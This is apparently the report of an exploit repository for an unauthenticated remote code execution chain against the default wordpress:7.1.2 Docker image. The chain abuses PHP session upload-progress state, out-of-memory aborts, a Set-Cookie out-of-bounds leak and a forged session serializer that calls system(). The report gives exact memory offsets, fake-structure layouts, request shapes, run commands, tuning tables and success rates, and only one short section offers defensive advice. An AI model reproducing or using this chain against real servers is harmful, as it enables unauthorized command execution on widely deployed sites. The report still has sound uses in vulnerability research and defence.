# wordpress:7.1.2 Default-Container External HTTP RCE

## Implementation and Verification Report

Authorized scope: this report and PoC are intended only for an isolated,
authorized laboratory environment. Do not use them against systems without
explicit permission.

## Contents

0. Summary
1. Threat Model and Constraints
2. Architecture
3. Worker Pinning
4. HTTP-Only Address Disclosure
5. Writing the Two Session Files
6. Worker Rotation and Arming
7. R1: Installing a Fake ps_serializer
8. R2: Calling zif_system
9. Key Offsets
10. Verification Results
11. Reproduction
12. Failure Modes and Tuning
13. Defensive Recommendations
14. Conclusion
Appendix A: HTTP Request Shapes
Appendix B: File Inventory

## 0. Summary

Target image (official Docker Hub):

    wordpress:7.1.2
    image digest: sha256:e04cf657f24889e96b5544828cdd5a92a0b51819f3e1899183f9be6ea0485edf

Runtime measured on the image:

    PHP 8.3.35 (NTS)
    Apache 2.4.68 (Debian), mpm_prefork
    StartServers 5, MaxSpareServers 10, MaxRequestWorkers 150
    memory_limit=128M, post_max_size=8M, max_input_vars=1000
    session.serialize_handler=php
    session.upload_progress.enabled=On
    session.upload_progress.cleanup=On
    session.use_strict_mode=Off
    opcache.enable=On

Result: real command execution on multiple independently started containers,
using only the container HTTP port (or an external network path to it):

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

A strictly default container was started with only:

    docker run -d --name ... wordpress:7.1.2

It had no -p, -e, -v, --cap-add, or --privileged option and no initialization
inside the container. The exploit did not use docker exec, gdb, or /proc; host
Docker was used only to start the container and to record the result.

## 1. Threat Model and Constraints

Attacker capabilities:

- Reach the target HTTP port from outside the container. If the port is not
  published, use an external network path such as an SSH tunnel or an existing
  TCP forwarder.
- Send arbitrary HTTP/1.1 requests, including chunked, multipart, Cookie, and
  query-string forms.
- Must not modify container files, modify php.ini, enter the container, use gdb,
  or read /proc.

Target constraints:

- Use the image defaults; no plugins, WordPress database, or authentication.
- The default deployment has 150 prefork workers. The PoC pins 149 of them and
  leaves one free worker.
- Once the worker pin is exact, the leak and arm stages are deterministic for a
  given image build.  The remaining random condition is a per-process ASLR
  gate (`0x7c` in the fake-string pointer), detected before arming.

## 2. Architecture

    Attacker client (outside the container)
      |
      +- run_ext.py              orchestration: pin -> leak -> rotate -> r1big -> frame -> rotate -> arm -> R1/R2 -> proof
      |    +- pin_adaptive.py    discover the worker count, free exactly one
      |    +- pin_slow_pause.py  fixed 149-connection pin
      |    +- big_a.py / b_leak20.py  A/B leak requests
      |    +- early_ok.py / arm_file2.py  arm producer and trigger
      |    +- profiles.py        A/B requests and leak parser
      |    +- stage_rce.py        sess_r1big / sess_trig2 / R1 / R2
      |    +- transport.py       HTTP and multipart transport
      |
      +- container HTTP 80/tcp

Repository files:

| File | Purpose |
|---|---|
| exploit/run_ext.py | End-to-end orchestration, leak parser, rotation/retry, proof fetch |
| exploit/pin_adaptive.py | Opens pins until the pool is saturated, then frees exactly one worker |
| exploit/pin_slow_pause.py | 149 unfinished chunked POSTs; leaves one free worker |
| exploit/big_a.py | Parameterised A request (heap-grooming knobs) |
| exploit/b_leak20.py | B request and 4 KiB OOB read |
| exploit/early_ok.py | Arm producer |
| exploit/arm_file2.py | Arm trigger with dummy-filename grooming |
| exploit/poc.py | Legacy request helpers used by the A/B tools |
| exploit/profiles.py | A/B request profiles and leak parser |
| exploit/stage_rce.py | Session-file producers, R1, and R2 |
| exploit/transport.py | Multipart construction and HTTP transport |
| demo.sh | One-command PoC runner using a published port |

## 3. Worker Pinning

Apache prefork starts 150 workers by default; MaxSpareServers=10 would reap idle
workers. A normal keep-alive pin is therefore unstable. The PoC instead uses
unfinished chunked POST bodies:

- Each connection sends POST /, Transfer-Encoding: chunked, and one valid 4 KiB
  chunk, but never sends the terminating zero chunk.
- Each worker is busy reading the body, so the MPM does not treat it as idle and
  MaxSpareServers cannot reap it.
- Every second, the client sends another 4 KiB chunk on each socket.  Apache's
  `mod_reqtimeout` is configured as `body=10,minrate=500`; the original 512 B/s
  traffic was only 2.4% above the minimum and a scheduling hiccup silently
  closed pins.  Each lost pin let prefork add an idle worker, after which the
  attack requests no longer landed on one child.  4 KiB/s is 8x the minimum and
  keeps the pool exact for the whole chain.
- 149 connections occupy 149 workers. The remaining single free worker handles
  all attack requests.

## 4. HTTP-Only Address Disclosure

### 4.1 A Request: Leaving Stale PS(id)

The A request (profiles.send_a) is about 66 MB. Its core shape is:

    PHPSESSID = NUL
    PHP_SESSION_UPLOAD_PROGRESS = k
    many big / filler fields
    a file part (triggers FILE_START)

When the parser reaches the file part:

    rfc1867_post_handler
      -> php_session_rfc1867_callback(FILE_START)
      -> php_rinit_session(0)
      -> php_session_initialize()
      -> php_session_reset_id()
      -> php_session_send_cookie()
      -> php_url_encode()   <- 4096-byte page allocation OOM

The request returns 500, but the worker survives and leaves:

    PS(id)          = stale/controlled zend_string
    PS(send_cookie) = 1
    SAPI header state = not cleaned up normally

### 4.2 B Request: Forging a zend_string and Reading Out of Bounds

The B request (profiles.send_b) is small:

    31 field names of 32 bytes with empty values   # fill bin7 slots 0..61
    1 value of 63 bytes                            # overwrite slot 62's stale zend_string
    PHPSESSID = attacksessionid0001
    PHP_SESSION_UPLOAD_PROGRESS = pwn
    no file part

The 63-byte value layout is:

    +0x10  len = 0x1000
    +0x18  P2SFAKE1 + ...

php_session_initialize() creates a 32-character session id during cleanup.
Because the preceding bin7 page was filled through slot 61, the new id
allocation hits slot 62 and overlaps the forged zend_string. PS(id)'s len
becomes 0x1000; php_session_send_cookie() calls php_url_encode(PS(id)) and
encodes the following heap bytes into Set-Cookie: PHPSESSID=..., producing a
4096-byte out-of-bounds read.

After URL decoding, the client receives 4104 bytes: the 4096-byte window plus
the trailing ; path=/ text.

### 4.3 Deriving Addresses from the Window

raw[0x6c8] in the window is a libphp opcode-handler pointer:

    libphp = raw[0x6c8] - 0x50ddbf

The parser also groups every 0x7f... qword by q & ~0x1fffff:

    chunk = most common 2 MiB bucket

After arming, the measured relationship is:

    H = chunk + 0x6a000

run_ext.py additionally scans known libphp data-pointer offsets such as
0x120eb90, 0x14f9490, and 0x1340280. It combines page alignment with a vote and
accepts the candidate with the highest count; the real base usually receives 14
votes, while the minimum threshold is 4.

The 4 KiB window is the source of **both** the base and the chunk.  A 2 MiB
read can also return the correct libphp base (verified against the worker's
maps), but its dominant 2 MiB bucket is a different chunk.  Using that bucket
for `H` yields a plausible-looking address that does not match the arm's
`BG.data`; the R1 fake serializer is then written to the wrong place.  The
driver therefore keeps the chunk from the 4 KiB window even when the base came
from a larger read.

Observed samples:

| Run | libphp base | chunk | H |
|---|---|---|---|
| run-1 | 0x751c8b681000 | 0x751c89a00000 | 0x751c89a6a000 |
| run-2 | 0x78cde6d86000 | 0x78cde5000000 | 0x78cde506a000 |
| default | 0x73e6330d7000 | 0x73e631400000 | 0x73e63146a000 |

### 4.4 Why a 4 KiB Window

Larger reads (1.7 MB, 2 MB, 3 MB) depend on whether memory after the ZendMM
chunk is mapped contiguously. On some containers they SIGSEGV, so B returns no
response. A 4 KiB read reliably returns 200. The handler cluster at raw[0x6c8]
appears once `index.php` has been compiled in this child: its op_array is laid
out at the head of the ZendMM chunk, directly behind the stale session string.
The first B of a fresh container may miss; the second returns the chunk; by the
third the cluster and the 14-vote base are present.  If `index.php` is already
cached in opcache (for example after `producer-bigfn`), the same window is
zeroed heap and no number of retries will bring the pointers back.  `run_ext.py`
therefore leaks **before** any request that executes `index.php` and retries in
place instead of rotating.

## 5. Writing the Two Session Files

### 5.1 /tmp/sess_r1big

producer-bigfn sends:

    POST / HTTP/1.1
    Cookie: PHPSESSID=r1big
    Content-Type: multipart/form-data; boundary=CCCCCCCCCC
    Transfer-Encoding: chunked

    PHPSESSID = r1big
    PHP_SESSION_UPLOAD_PROGRESS = k
    file part name=f, filename=30 MiB of F, data=XXXXXXXX
    normal field name=big, data=120 MiB of B

Because the chunked request has no Content-Length, rfc1867_post_handler skips
the post_max_size=8M check and accepts the 150 MB body for multipart parsing.

When the parser reaches the file part:

    MULTIPART_EVENT_FILE_START
      -> php_rinit_session(0)
      -> PS(id) = r1big
      -> php_session_rfc1867_update()
      -> php_session_initialize()
      -> s_read() reads an empty file
      -> write $_SESSION[upload_progress_k][files][0][name] = 30 MiB of F...
      -> php_session_flush(1)
      -> ps_files_write()
      -> /tmp/sess_r1big

Measured file size:

    31,457,602 B = 30 MiB filename + about 322 B of serialization overhead

The trailing 120 MB field causes OOM after the file has been written.
zend_bailout() skips the MULTIPART_EVENT_END upload-progress cleanup, so the
file remains.  The write must happen on a freshly forked child: after the leak
or any earlier OOM, `real_size` is already close enough to the limit that the
30 MiB filename allocation aborts before the session flush, leaving a 322-byte
file.  `run_ext.py` rotates first and then runs `producer-bigfn`.

R1 reads this file with PHPSESSID=r1big. The 30 MB filename is the value-side
OOM trigger in R1.

### 5.2 /tmp/sess_trig2

producer-frame sends PHPSESSID=trig2, PHP_SESSION_UPLOAD_PROGRESS=key, and a
file part. The key is a 0x4000-byte fake zend_execute_data:

    key offset 0x1C: num_args = 1
    key offset 0x40: arg1.value = H + 0x400
    key offset 0x48: arg1.type = IS_STRING (6)

The upload_progress_ prefix occupies 0x10 bytes, so the fake structure's field
offsets in the key correspond to the session file with a 0x10 subtraction. The
file size is 16,697 B.

## 6. Worker Rotation and Arming

### 6.1 Rotation

The leak and file writing change the free worker's heap state. Before arming,
the PoC sends:

1. An A request (leaving stale state again);
2. A B request with LEAK=0x800000 (8 MiB OOB read).

The 8 MiB read normally triggers SIGSEGV, the current free worker exits, and
Apache prefork forks a clean worker. The new worker's ZendMM chunk base remains
consistent with the leaked chunk.  A complete response means the read stayed in
mapped memory and the child survived; the driver treats only `resp 0` / no
status line as success, and retries with 12 MiB and 24 MiB reads otherwise.

### 6.2 Arming

arm.send_producer() sends a 30 MB progress key plus a 120 MB big field, returns 500
after OOM, writes /tmp/sess_bgsid, and raises the worker's real_size.

arm.send_trigger() sends:

    PHPSESSID = bgsid
    34 MB normal big field
    1 MB filename dummy file part
    PHP_SESSION_UPLOAD_PROGRESS
    trigger file part

At FILE_START, emalloc(0x2018) obtains H from the contiguous pages left by the
dummy. The subsequent 30 MB key zend_string_init then OOMs. zend_bailout()
skips RINIT cleanup and leaves:

    BG.data  = H
    BG.level = 1

The arm trigger returning 500 is the success oracle. A 302 means the worker did
not reach the intended OOM window; the PoC rotates again and retries, up to
three times.

## 7. R1: Installing a Fake ps_serializer

R1 request:

    PHPSESSID = r1big
    PHP_SESSION_UPLOAD_PROGRESS = pwn
    38 MB normal big field
    64 registered 0x2017 fake php_unserialize_data fields
    file part

The fake structure at H:

| Offset | Value | Purpose |
|---|---|---|
| +0x00 | H+0x200 | var_entries.last |
| +0x10 | H+0x300 | last_dtor |
| +0x30 | 1000 | max_depth |
| +0x200 | N0 | var_entries.used_slots |
| +0x300 | 0 | dtor used_slots |
| +0x310 | 0 | fake serializer name |
| +0x318 | 0 | encode |
| +0x320 | zif_system | decode |

Where:

    N0 = (psg + 0x148 - (H + 0x200) - 0x10) // 8   # 64-bit wrap

psg + 0x148 is PS(serializer). var_push() writes an 8-byte zval value. The
64-bit wrap makes the first write land exactly on PS(serializer), with the value
H+0x310. last_dtor=H+0x300 prevents mod_user_class_name from being touched.

The 30 MB filename triggers a value-side OOM, aborting the request while the
worker retains:

    BG.level        = 2
    PS(serializer)  = H+0x310

## 8. R2: Calling zif_system

R2 request:

    PHPSESSID = trig2
    PHP_SESSION_UPLOAD_PROGRESS = pwn
    900 fake fields
    file part

The 900 fake fields occupy H again and write:

- The fake ps_serializer at H+0x310 with decode = base+0x3ac080 (zif_system);
- A fake zend_string at H+0x400:

    +0x400  gc = 1 | (0x106 << 32)   # refcount=1, IS_STRING_EX
    +0x408  h = 0
    +0x410  len = len(cmd)
    +0x418  data = cmd

FILE_START reads /tmp/sess_trig2. php_session_decode() sees
PS(serializer)=H+0x310 and directly calls:

    ((ps_serializer*)H+0x310)->decode(val)
      = zif_system(val)

val is the 16 KB session data from sess_trig2. The first 0x60 bytes are the fake
zend_execute_data; arg1 points to the fake zend_string at H+0x400, whose
contents are id>/var/www/html/pwn.txt. The command runs as www-data and the
proof is written to the webroot. The worker may crash after execution, but the
proof has already been written.

## 9. Key Offsets

All offsets are relative to the loaded libphp.so base for this image:

| Symbol or field | Offset |
|---|---|
| ps_globals | base+0x10432a0 |
| zif_system | base+0x3ac080 |
| opcode handler leak | base+0x50ddbf (raw[0x6c8]) |
| libphp data pointer leak | base+0x120eb90, etc. |
| BG(unserialize).data | base+0x10552a0+0x358 |
| PS(serializer) | ps_globals+0x148 |
| PS(http_session_vars) | ps_globals+0x150 |
| PS(mod_user_class_name) | ps_globals+0x140 |
| H | chunk+0x6a000 |

## 10. Verification Results

Three independent runs produced:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)

| Run | Access | libphp base | chunk | H |
|---|---|---|---|---|
| run-1 | published port 18099 | 0x751c8b681000 | 0x751c89a00000 | 0x751c89a6a000 |
| run-2 | published port 18100 | 0x78cde6d86000 | 0x78cde5000000 | 0x78cde506a000 |
| default | no published port, external tunnel | 0x73e6330d7000 | 0x73e631400000 | 0x73e63146a000 |

Stability batch with the final driver (a fresh `wordpress:7.1.2` container per
row, adaptive pin, 4 KiB leak, fresh-fork producers):

| Target | Result | Time |
|---|---|---|
| fresh containers A-I | `uid=33(www-data)` on all nine | 24-26 s each |
| same container C, `--base/--h` reuse | `uid=33(www-data)` | 24 s |
| fresh container J | stopped before arming: `0x7c` in the fake-string pointer | - |

Nine consecutive fresh-container successes were measured after the pin-rate
and leak-ordering fixes.  The one stop was the ASLR gate, detected from the
leaked `H` before any session-file work; it is not a heap or timing failure.

The default run used only docker run -d --name ... with no -e, -v, --cap-add, or
--privileged option. The anonymous /var/www/html volume was created by the
image's own VOLUME declaration. The run reached the container HTTP port through
an external network path; the forwarding itself did not modify the container.

This repository intentionally contains only the documentation, PoC scripts, and
a short README demo GIF; raw logs and proof files are not retained.

## 11. Reproduction

### 11.1 Published Port

    cd php2shell-wordpress-rce
    docker run -d --name run-2 -p 18100:80 wordpress:7.1.2
    cd exploit
    python3 run_ext.py --port 18100 --shell 'id>/var/www/html/pwn.txt'
    curl http://127.0.0.1:18100/pwn.txt

### 11.2 No Published Port

If the container has no published port, the operator must provide a network path
from the client to the container's 80/tcp endpoint, for example an SSH tunnel or
an existing TCP forwarder. The PoC itself only requires a reachable HTTP
endpoint; it does not enter or modify the container.

run_ext.py starts the 149-connection pin itself and sends only HTTP to the
target. It does not call Docker, gdb, or /proc.

## 12. Failure Modes and Tuning

| Symptom | Cause | Action |
|---|---|---|
| B returns no Set-Cookie or response 0 | Heap layout miss or a large OOB read hit an unmapped page | Retry with a 4 KiB read; do not rely on 2/3 MiB reads |
| Leak returns 4104 B but no handler pointer | `index.php` is already cached in opcache (the leak ran after `producer-bigfn`) or the first-round op_array is not laid out yet | Leak before any `index.php` request; retry in place; do not rotate during the leak |
| Arm trigger returns 302 | Worker did not reach the intended OOM window | Rotate with A + 8 MiB B and retry |
| H+0x400 contains 0x7c | Per-process ASLR: every mmap address in this child shares that byte; PHP rejects the upload-progress key as a session delimiter | Start a fresh container / use another target process |
| sess_r1big is only a few hundred bytes | `producer-bigfn` ran on a dirty worker whose `real_size` was already high | Rotate to a fresh child first; run `producer-bigfn` there |
| Pin holds fewer workers or requests split across children | Pins dropped below `mod_reqtimeout`'s 500 B/s body minimum (the old 512 B/s traffic) | Send 4 KiB/s; use the adaptive pin and watch the `dropped` counter |
| Base looks right but R1/R2 fail | `H` came from a 2 MiB window's dominant cluster instead of the 4 KiB chunk | Use `chunk` from the 4 KiB read; `H = chunk + 0x6a000` |
| PS(serializer) is unchanged after R1 | base/H mismatch | Check leak votes and the 4 KiB chunk; verify `BG.data` in the lab |

## 13. Defensive Recommendations

- Disable session.upload_progress.enabled when upload progress is not required;
  it is the central entry point for this chain.
- Keep PHP patched. The chain depends on the 8.3.35 session/OOM behavior and
  should not be assumed to work on other builds.
- Monitor unusually long Set-Cookie values, bursts of 500/OOM responses, and
  unexpected growth of /tmp/sess_* files.
- Do not rely on a WAF alone: this is a PHP engine state issue and application
  rules may not recognize it.
- Use dedicated worker pools, upload-size limits, and temporary-directory quotas
  for high-value services to reduce the blast radius.

## 14. Conclusion

On the default wordpress:7.1.2 image, an attacker can use HTTP alone to:

1. Pin all but one prefork worker;
2. Leave stale PS(id) state through a session upload-progress OOM;
3. Recover libphp and the ZendMM chunk through a 4 KiB Set-Cookie OOB read;
4. Install a fake ps_serializer using a 30 MB filename session file and 0x2017
   fake php_unserialize_data fields;
5. Call zif_system through a 16 KB sess_trig2 fake zend_execute_data;
6. Execute a command as www-data and write a proof file to the webroot.

The same result was verified on a strictly default container with no published
port, no extra environment variables, no extra volumes, and no added
capabilities. The issue is not a WordPress plugin or authentication flaw; it is
the combination of PHP session/OOM state and cross-request prefork residue.

## 15. Alternative Primitive Assessment (not used)

The shipped chain is the fake-`ps_serializer` route.  Two alternatives were
implemented far enough to measure their limits.  They are recorded here as
negative results so future work does not repeat them.

### 15.1 PG(auto_prepend_file) overwrite

Target resolution:

- `core_globals` is `libphp+0x1059100`.
- The runtime `zend_ini_entry_def` for `auto_prepend_file` has
  `mh_arg1=0xa0` and `mh_arg2=&core_globals`, so the field is
  `base+0x10591a0`.
- The fake `var_entries` write reaches that address and `/proc` reads it back;
  the write itself is not the problem.

Write-value problem:

- `var_entries` is `{ zend_long used_slots; void *next; zval *data[...]; }`;
  `data` starts at `+0x10`.  `var_push` executes
  `var_hash->data[used_slots] = rval`, where `rval` points at the
  unserializer's dtor temp zval.
- `var_push_dtor` fills the same slot with a zval.  The value written to
  `PG(auto_prepend_file)` is therefore the zval's address, not a filename.
- The working fake serializer uses the 16-byte zval at `H+0x310` as a boundary:
  its `decode` pointer sits at `H+0x320`, immediately after the zval, so the
  dtor cannot clobber the pointer the chain needs.  A path string at
  `H+0x310` is always clobbered.

Layout constraints found:

- A 30 MiB `sess_r1big` is required to keep the session file buffer out of the
  ZendMM chunk head.  With a 326-byte session file the buffer landed at `H`
  and `H+0x10` became 326; `var_tmp_var` dereferenced 326 and SIGSEGV'd at
  `base+0x3fa1fe`.
- PHP's upload-progress array keeps only one file (`files a:1` even for two
  file parts) and does not store `type`; there is no controllable large
  allocation after a small `name`.
- A 5 MiB progress-key kept the session large enough but changed the heap so
  the 64 fake fields no longer populated `H` (`H+0x00` was not `H+0x200`); the
  worker crashed at `base+0x4b7d4b`.
- A 30 MiB filename whose first bytes are `/tmp/sess_pgshell\0` keeps `H`
  populated and sets `PG=H+0x310`, but after the OOM the huge allocation is no
  longer a mapped `zend_string` (a scan of the worker found no 30 MiB header).

Conclusion: this route needs a raw 8-byte write, or a mapped-chunk groom the
current `var_push` primitive does not provide.

### 15.2 OPcache type confusion

Measured on a fresh default container with `opcache.enable=On`:

    opcache.memory_consumption      = 128 MiB
    opcache.max_accelerated_files   = 4000
    opcache.interned_strings_buffer = 8 MiB
    opcache.validate_timestamps     = On

All 1,513 PHP files in the webroot were compiled with
`opcache_compile_file()` (21,412,735 source bytes):

    used_memory        = 52,307,936 B
    free_memory        = 81,909,792 B
    num_cached_scripts = 1,513
    max_cached_keys    = 7,963
    oom_restarts       = 0
    hash_restarts      = 0

At roughly 34.6 KiB of shared memory per script, filling 128 MiB needs about
3,700 unique scripts.  The default tree has 1,513; the `/usr/src/wordpress`
copy is not web-reachable, and there is no unauthenticated way to add
thousands of unique PHP files.  The persist failure that drives the type
confusion is a shared-memory allocation failure, not a request `memory_limit`
OOM, so ordinary OOM requests cannot substitute for it.  The route is not
reachable on this default image without an application or plugin set that
supplies more scripts.

### 15.3 Fatal-error backtrace

`last_fatal_error_backtrace` and `fatal_error_backtraces` were added in PHP
8.5.  PHP 8.3/8.4, including this image's 8.3.35, contain neither; there is no
stale backtrace field to consume and no `fatal_error_backtraces` setting to
inspect.  On PHP 8.5 the setting is on by default and is the confirmed
mod_php path; `display_errors=Off` does not block it, and the 8.5-only
mitigation is `fatal_error_backtraces=0`.

## Appendix A: HTTP Request Shapes

    A:     PHPSESSID=NUL + progress + about 66 MB multipart -> 500
    B:     31 field names of 32 B + 63 B forged value + PHPSESSID=attacksessionid0001
           + progress, no file part, LEAK=0x1000 -> 200 + 4104 B Set-Cookie
    r1big: PHPSESSID=r1big + progress=k + file(f, filename=30 MiB F) + 120 MiB big
           -> 500; /tmp/sess_r1big = 31,457,602 B
    trig2: PHPSESSID=trig2 + progress=fake_execute_data + file(a.txt) + 120 MiB big
           -> 500; /tmp/sess_trig2 = 16,697 B
    arm:   arm.send_producer (30 MB key + 120 MB) then arm.send_trigger (34 MB + 1 MB dummy + file)
    R1:    PHPSESSID=r1big + progress=pwn + 38 MB big + 64 x 0x2017 fake + file
    R2:    PHPSESSID=trig2 + progress=pwn + 900 fake fields + file

## Appendix B: File Inventory

    README.md
    REPORT.md
    SECURITY.md
    demo.sh
    assets/demo.gif
    exploit/run_ext.py
    exploit/pin_slow_pause.py
    exploit/transport.py
    exploit/profiles.py
    exploit/arm.py
    exploit/stage_rce.py
